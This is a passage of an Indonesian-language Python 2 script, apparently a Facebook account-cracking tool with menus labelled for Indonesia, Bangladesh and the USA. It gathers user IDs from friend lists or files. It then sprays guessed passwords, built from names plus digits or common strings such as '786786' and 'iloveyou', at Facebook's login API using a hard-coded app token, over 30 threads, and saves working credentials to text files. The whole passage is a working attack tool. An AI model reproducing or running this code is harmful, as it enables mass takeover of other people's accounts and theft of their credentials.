																	print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos7
																	cek = open("done/indo.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'123'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos8
																		oke = open("done/indo.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
																			print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
																			print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos8
																			cek = open("done/indo.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mSelesai ...'
	print"\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m{\033[1;93m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;93mfile tersimpan \033[1;91m: \033[1;92mdone/indo.txt'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m{<\033[1;93mKembali\033[1;97m>}")
	os.system("python2 cr4ck.py")
	
##### CRACK BANGLADESH #####
def crack_bangla():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m{\x1b[1;91m!\x1b[1;97m} Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	print "\033[1;97m{\033[1;96m01\033[1;97m} Crack Dari Daftar Teman"
	print "\033[1;97m{\033[1;96m02\033[1;97m} Crack Dari Publik/Teman"
	print "\033[1;97m{\033[1;96m03\033[1;97m} Crack Dari File"
	print "\033[1;97m{\033[1;91m00\033[1;97m} Kembali"
	print 50* "\033[1;94m─"
	pilih_bangla()

#### PILIH BANGLADESH ####
def pilih_bangla():
	teak = raw_input("\033[1;96m︻デ═一▸ \033[91m:\033[1;92m ")
	if teak =="":
		print"\033[1;97m{\033[1;91m!\033[1;97m} Isi Yg Benar !"
		pilih_bangla()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print 50* "\033[1;94m─"
		print ("             \033[1;96m●●● \033[1;97mCRACK BANGLADESH \033[1;96m●●●")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		print 50* "\033[1;94m─"
		print ("             \033[1;96m●●● \033[1;97mCRACK BANGLADESH \033[1;96m●●●")
		print 50* "\033[1;94m─"
		idb = raw_input("\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m ID Publik/Teman \033[1;91m:\033[1;92m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idb+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m Nama \033[1;91m:\033[1;92m "+sp["name"]
		except KeyError:
			print"\033[1;97m{\033[1;91m!\033[1;97m} ID publik/teman tidak ada !"
			raw_input("\n\033[1;96m{\033[1;97m<Kembali>\033[1;96m}")
			crack_bangla()
		except requests.exceptions.ConnectionError:
			print"{!} Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idb+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print 50* "\033[1;94m─"
			print ("             \033[1;96m●●● \033[1;97mCRACK BANGLADESH \033[1;96m●●●")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m Nama File \033[1;91m:\033[1;92m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada ! '
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
		except IOError:
			print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada !'
			raw_input("\n\033[1;96m{\033[1;97m<Kembali>\033[1;96m}")
			crack_bangla()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m{\033[1;91m!\033[1;97m} Isi Yg Benar !"
		pilih_bangla()
	
	print "\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m Total ID \033[1;91m:\033[1;92m "+str(len(id))
	print('\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m Stop Tekan CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mGunakan Mode Pesawat Jika Tidak Ada Hasil")
	print ("\033[1;94m──────────────────────────────────────────────────")
	
##### MAIN BANGLADESH #####
	def main(arg):
		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
		global cekpoint,oks
		zowe = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos1
				oke = open("done/bangla.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos1
					cek = open("done/bangla.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos2
						oke = open("done/bangla.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos2
							cek = open("done/bangla.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos3
								oke = open("done/bangla.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos3
									cek = open("done/bangla.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('786786')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos4
										oke = open("done/bangla.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos4
											cek = open("done/bangla.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = ('bangladesh')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos5
												oke = open("done/bangla.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos5
													cek = open("done/bangla.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['first_name'].lower()+'786'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos6
														oke = open("done/bangla.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos6
															cek = open("done/bangla.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = j['last_name'].lower()+'123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos7
																oke = open("done/bangla.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
																	print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
																	print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
																	print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos7
																	cek = open("done/bangla.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'1234'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos8
																		oke = open("done/bangla.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
																			print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
																			print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
																			print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos8
																			cek = open("done/bangla.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mSelesai ...'
	print"\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mTotal \033[1;92mOK\033[1;97m/\x1b[1;96mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m{\033[1;96m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;96mCP \033[1;96mfile tersimpan \033[1;91m: \033[1;92mdone/bangla.txt'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m{<\033[1;96mKembali\033[1;97m>}")
	os.system("python2 cr4ck.py")
	
##### CRACK USA #####
def crack_usa():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	print "\033[1;97m{\033[1;95m01\033[1;97m} Crack Dari Daftar Teman"
	print "\033[1;97m{\033[1;95m02\033[1;97m} Crack Dari Publik/Teman"
	print "\033[1;97m{\033[1;95m03\033[1;97m} Crack Dari File"
	print "\033[1;97m{\033[1;91m00\033[1;97m} Kembali"
	print 50* "\033[1;94m─"
	pilih_usa()

#### PILIH USA ####
def pilih_usa():
	teak = raw_input("\033[1;95m︻デ═一▸ \033[91m:\033[1;92m ")
	if teak =="":
		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"
		pilih_usa()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print 50* "\033[1;94m─"
		print ("                \033[1;95m●●● \033[1;97mCRACK USA \033[1;95m●●●")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		print 50* "\033[1;94m─"
		print ("                \033[1;95m●●● \033[1;97mCRACK USA \033[1;95m●●●")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mID Publik/Teman \033[1;91m:\033[1;92m ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mNama \033[1;91m:\033[1;92m "+op["name"]
		except KeyError:
			print"\033[1;97m{\033[1;91m!\033[1;97m} ID publik/teman tidak ada !"
			raw_input("\n\033[1;95m[\033[1;97m<Kembali>\033[1;95m]")
			crack_usa()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m{\033[1;91m!\033[1;97m} Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print 50* "\033[1;94m─"
			print ("                \033[1;95m●●● \033[1;97mCRACK USA \033[1;95m●●●")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mNama File\033[1;91m :\033[1;92m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada ! '
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
		except IOError:
			print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada !'
			raw_input("\n\033[1;95m[\033[1;97m<Kembali>\033[1;95m]")
			crack_usa()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_usa()
	
	print "\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mTotal ID \033[1;91m:\033[1;92m "+str(len(id))
	print('\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mStop Tekan CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mGunakan Mode Pesawat Jika Tidak Ada Hasil")
	print ("\033[1;94m──────────────────────────────────────────────────")
	
##### MAIN USA #####
	def main(arg):
		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
		global cekpoint,oks
		zowe = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = ('iloveyou')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos1
				oke = open("done/usa.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
					print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
					print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
					print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos1
					cek = open("done/usa.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = ('123456')
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos2
						oke = open("done/usa.txt", "a")
